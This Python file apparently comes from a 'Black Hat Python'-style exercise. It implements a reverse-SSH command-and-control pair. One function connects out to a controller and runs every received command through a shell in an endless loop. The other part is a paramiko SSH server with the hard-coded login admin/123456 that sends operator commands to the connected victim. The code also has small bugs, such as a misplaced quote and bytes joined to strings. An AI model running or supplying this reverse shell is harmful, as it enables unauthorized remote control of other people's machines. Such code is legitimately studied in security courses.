import threading
import paramiko
import subprocess
import sys
import socket


def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

# program below creates a SSH server that SSH client can cannect to
# using the key from the Paramiko demo files
host_key = paramiko.RSAKey(filename='test_rsa.key')

class Sever(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if username == 'admin' and password == '123456':
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

sever = sys.argv[1]

ssh_port = int(sys.argv[2])

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((sever, ssh_port))
    sock.listen(100)
    print("[+] Listening for connection ...")
    client, addr = sock.accept()
except Exception as e:
    print("[-] Listen failed: ' + str(e)")
    sys.exit(1)

try:
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(host_key)
    sever = Sever()
    try:
        bhSession.start_server(server=sever)
    except paramiko.SSHException as e:
        print("[-] SSH negotiation failed.")
    chan = bhSession.accept(20)
    print("[+] Authenticated!")
    print(chan.recv(1024))
    chan.send('Welcome to bh_ssh')
    while True:
        try:
            command = input("Enter command").strip('\n')
            if command != 'exit':
                chan.send(command)
                print(chan.recv(1024)+'\n')
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                raise Exception('exit')
        except KeyboardInterrupt:
            bhSession.close()
except Exception as e:
    print("[-] Caught exception: " + str(e))
    try:
        bhSession.close()
    except:
        pass
    sys.exit(1)
